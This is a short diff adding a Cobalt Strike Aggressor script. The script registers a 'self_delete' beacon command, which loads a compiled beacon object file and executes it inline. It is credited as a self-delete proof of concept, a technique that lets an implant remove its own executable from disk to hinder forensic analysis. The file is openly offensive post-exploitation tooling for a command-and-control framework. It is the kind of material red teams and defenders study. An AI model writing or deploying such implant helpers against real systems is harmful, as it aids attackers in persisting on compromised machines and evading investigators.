@@ -1,0 +1,14 @@
+beacon_command_register(
+"self_delete",
+"LloydLabs/jonaslyk self-delete PoC.",
+"Synopsis: self_delete");
+
+alias self_delete {
+    local('$handle $args $data');
+
+    $handle = openf(script_resource("self_delete.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    beacon_inline_execute($1, $data, "go");
+}
